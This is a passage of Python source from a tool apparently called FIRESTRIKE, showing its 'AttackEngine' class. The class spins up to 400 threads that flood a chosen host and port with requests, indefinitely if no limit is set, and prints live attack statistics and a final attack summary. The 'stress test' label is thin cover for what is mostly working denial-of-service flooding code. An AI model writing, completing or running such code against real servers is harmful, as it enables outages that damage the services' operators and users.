# ATTACK ENGINE
# ──────────────────────────────────────────
class AttackEngine:
    """Core attack engine — manages threads and statistics."""

    def __init__(self, target: Target, threads: int, total_req: int):
        self.target = target
        self.thread_count = min(threads, 400)  # Termux safety cap
        self.total_requests = total_req
        self._builder = RequestBuilder()
        self._sender = SocketSender()

    def _worker(self):
        """Worker thread — sends requests until stopped."""
        global _REQUESTS_SENT, _REQUESTS_FAILED, _RUNNING, _ACTIVE_THREADS

        with _LOCK:
            _ACTIVE_THREADS += 1

        while _RUNNING:
            # Check request limit
            with _LOCK:
                if _TOTAL_REQUESTS > 0 and _REQUESTS_SENT >= _TOTAL_REQUESTS:
                    _RUNNING = False
                    break

            request_data, used_path = self._builder.build(self.target)
            success, latency = self._sender.send(
                self.target.host,
                self.target.port,
                self.target.ssl,
                request_data
            )

            with _LOCK:
                if success:
                    _REQUESTS_SENT += 1
                    _LATENCY_HISTORY.append(latency)
                else:
                    _REQUESTS_FAILED += 1
                    _REQUESTS_SENT += 1  # Still count it as "sent"

        with _LOCK:
            _ACTIVE_THREADS -= 1

    def _stats_display(self):
        """Display real-time statistics during attack (runs in main thread)."""
        global _REQUESTS_SENT, _REQUESTS_FAILED, _RUNNING, _START_TIME

        while _RUNNING:
            time.sleep(0.5)

            with _LOCK:
                sent = _REQUESTS_SENT
                failed = _REQUESTS_FAILED
                active = _ACTIVE_THREADS
                latency_list = list(_LATENCY_HISTORY)

            elapsed = time.time() - _START_TIME
            rps = sent / elapsed if elapsed > 0 else 0
            avg_latency = sum(latency_list) / len(latency_list) if latency_list else 0

            # Build stats display
            elapsed_str = str(timedelta(seconds=int(elapsed)))
            success_rate = ((sent - failed) / sent * 100) if sent > 0 else 0

            sys.stdout.write("\033[s")  # Save cursor position
            sys.stdout.write("\033[?25l")  # Hide cursor

            # ── Stats Panel ──
            print()
            print(f"  {CB('╔══════════════════════════════════════════════════════════╗')}")
            print(f"  {CB('║')}   {RB('⚠  FIRESTRIKE v' + VERSION + ' — STRESS TEST IN PROGRESS')}          {CB('║')}")
            print(f"  {CB('╠══════════════════════════════════════════════════════════╣')}")
            print(f"  {CB('║')}  {Y('Target:')}    {W(self.target.host + ':' + str(self.target.port))} {'🔒' if self.target.ssl else '🔓'}                    {CB('║')}")
            print(f"  {CB('║')}  {Y('Elapsed:')}   {W(elapsed_str)}                              {CB('║')}")
            print(f"  {CB('║')}  {Y('Requests:')}  {W(str(sent))} total | {G(str(sent - failed))} OK | {R(str(failed))} FAIL           {CB('║')}")
            print(f"  {CB('║')}  {Y('Rate:')}      {GB(f'{rps:.1f}')} {W('req/s')} | {Y('Avg Latency:')} {GB(f'{avg_latency:.1f}')} {W('ms')}        {CB('║')}")
            print(f"  {CB('║')}  {Y('Threads:')}   {W(str(active))} active                     {CB('║')}")
            print(f"  {CB('║')}  {Y('Success:')}   {GB(f'{success_rate:.1f}%')}                               {CB('║')}")

            # Progress bar
            if _TOTAL_REQUESTS > 0:
                bar = ProgressBar.render(sent, _TOTAL_REQUESTS)
                print(f"  {CB('║')}  {Y('Progress:')}  {bar}                  {CB('║')}")

            print(f"  {CB('╚══════════════════════════════════════════════════════════╝')}")
            print(f"  {R('Press Ctrl+C to stop')}")
            print()

            # Restore cursor
            sys.stdout.write("\033[u")
            sys.stdout.write("\033[?25h")  # Show cursor
            sys.stdout.flush()

            if not _RUNNING:
                break

    def run(self):
        """Start the attack with all threads."""
        global _RUNNING, _REQUESTS_SENT, _REQUESTS_FAILED, _TOTAL_REQUESTS, _START_TIME

        # Reset state
        _REQUESTS_SENT = 0
        _REQUESTS_FAILED = 0
        _RUNNING = True
        _TOTAL_REQUESTS = self.total_requests
        _START_TIME = time.time()
        _LATENCY_HISTORY.clear()

        print()
        print(f"  {RB('┌────────────────────────────────────────────────────────┐')}")
        print(f"  {RB('│')}  {CB('ATTACK CONFIGURATION')}                               {RB('│')}")
        print(f"  {RB('├────────────────────────────────────────────────────────┤')}")
        print(f"  {RB('│')}  {Y('Target:')}     {W(self.target.host)}:{GB(str(self.target.port))} ({'HTTPS' if self.target.ssl else 'HTTP'})          {RB('│')}")
        print(f"  {RB('│')}  {Y('Threads:')}    {W(str(self.thread_count))}                              {RB('│')}")
        print(f"  {RB('│')}  {Y('Requests:')}   {W('∞ (infinite)' if self.total_requests == 0 else str(self.total_requests))}                  {RB('│')}")
        print(f"  {RB('│')}  {Y('Platform:')}   {W('Termux (Android)' if _IS_TERMUX else 'Linux/Unix')}                {RB('│')}")
        print(f"  {RB('└────────────────────────────────────────────────────────┘')}")
        print()

        # Start worker threads
        threads = []
        for i in range(self.thread_count):
            t = threading.Thread(target=self._worker, daemon=True)
            t.start()
            threads.append(t)

        # Show stats (main thread)
        try:
            self._stats_display()
        except Exception:
            pass
        finally:
            _RUNNING = False
            # Wait for workers to finish
            for t in threads:
                t.join(timeout=2)
            SocketSender.cleanup()

        # Summary
        elapsed = time.time() - _START_TIME
        sent = _REQUESTS_SENT
        failed = _REQUESTS_FAILED
        rps = sent / elapsed if elapsed > 0 else 0

        print()
        print(f"  {GB('┌────────────────────────────────────────────────────────┐')}")
        print(f"  {GB('│')}  {RB('✓ ATTACK COMPLETE — FINAL STATISTICS')}                {GB('│')}")
        print(f"  {GB('├────────────────────────────────────────────────────────┤')}")
        print(f"  {GB('│')}  {Y('Total Sent:')}  {W(str(sent))}                                {GB('│')}")
        print(f"  {GB('│')}  {Y('Successful:')} {G(str(sent - failed))} ({GB(f'{((sent-failed)/sent*100) if sent else 0:.1f}%')})                   {GB('│')}")
        print(f"  {GB('│')}  {Y('Failed:')}     {R(str(failed))}                                 {GB('│')}")
        print(f"  {GB('│')}  {Y('Avg Rate:')}   {GB(f'{rps:.1f}')} {W('req/s')}                             {GB('│')}")
        print(f"  {GB('│')}  {Y('Duration:')}   {W(str(timedelta(seconds=int(elapsed))))}                        {GB('│')}")
        print(f"  {GB('└────────────────────────────────────────────────────────┘')}")
        print()

        input(f"{W('Press Enter to return to menu...')}")

